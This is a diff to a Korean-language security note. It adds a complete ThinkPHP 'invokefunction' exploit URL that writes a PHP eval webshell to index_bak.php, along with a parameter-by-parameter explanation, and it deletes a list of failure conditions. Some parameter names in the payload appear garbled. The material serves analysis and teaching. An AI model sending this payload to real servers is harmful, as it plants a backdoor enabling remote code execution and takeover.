@@ -35,6 +35,39 @@
 
 ## 📎 예제 1. ThinkPHP `invokefunction` POC (MD5 페이로드)
 
+
+```
+https://www.example.com/index.php?s\=/Index/\\think\\app/invokefunction&function\call_user_func_array&vars[0]\=file_put_contents&vars[1][]\=index_bak.php&vars[1][]\=<?php%20@eval($_POST['pwd']);?>hello
+```
+
+* `index.php?s\=/Index/\\think\\app/invokefunction`
+
+  * `s=/Index/\\think\\app/invokefunction` 은 ThinkPHP 프레임워크의 내부 라우팅 / 디버그 엔드포인트를 직접 호출하려는 구조입니다. 공격자 의도: 프레임워크의 내부 함수(invokefunction)를 호출해서 임의 함수 실행.
+  * 백슬래시(`\\`)는 namespacing/escape로 보이며, 실제 서버 쪽에서 어떻게 디코딩되는지가 중요합니다.
+
+* `&function\ll_user_func_array`
+
+  * `call_user_func_array`(PHP 표준 함수)는 첫번째 인수에 호출할 함수(예: `file_put_contents`), 두번째 인수에 인수 배열을 받아 **임의 함수 호출**을 가능하게 합니다.
+
+* `&vars[0]=file_put_contents`
+
+  * 호출하려는 함수: `file_put_contents` — 파일을 생성/쓰기하는 PHP 표준 함수. 즉 목적은 파일 생성(웹셸 저장).
+
+* `&vars[1][]=index_bak.php`
+
+  * `file_put_contents`의 첫 번째 인자(파일명) — 웹서버가 접근 가능한 경로(웹루트)에 index_bak.php로 생성되면 곧바로 웹에서 실행 가능해질 수 있습니다.
+
+* `&vars[1][]=<?php%20@eval($_POST['pwd']);?>hello`
+
+  * `file_put_contents`의 두번째 인자(파일 내용). URL 인코딩: `%20` → 공백. 실제 내용은:
+
+    ```
+    <?php @eval($_POST['pwd']);?>hello
+    ```
+  * `<?php @eval($_POST['pwd']);?>` : 전형적인 POST-based 웹셸. 공격자가 이후 `POST`로 `pwd` 파라미터에 PHP 코드를 넣어 서버에서 실행하게 함.
+  * `hello` : 흔히 쓰이는 “마커”(fingerprint) — 파일이 실제로 생성됐는지 확인하려는 식별자.
+ 
+<br>
 * 아래 페이로드는 `임의 함수 호출(POC)`, 성공하면 **RCE로 악용 가능**
 
 ```
@@ -45,15 +78,6 @@
 ```
 
 * 의도: 내부에서 `call_user_func_array('md5', ['HelloThinkPHP'])` 실행 유도 → 응답으로 MD5가 나오면 호출 성공.
-
-
-### 불완전(실패) 조건 예시
-
-* `invokefunction` 접근에 인증/권한 필요
-* 함수 호출 시 화이트리스트 적용
-* `disable_functions`로 위험 함수 비활성화
-* WAF/필터가 요청 차단
-* 호출 결과가 외부에 노출되지 않음
 
 
 ### 완전한 RCE가 되려면 
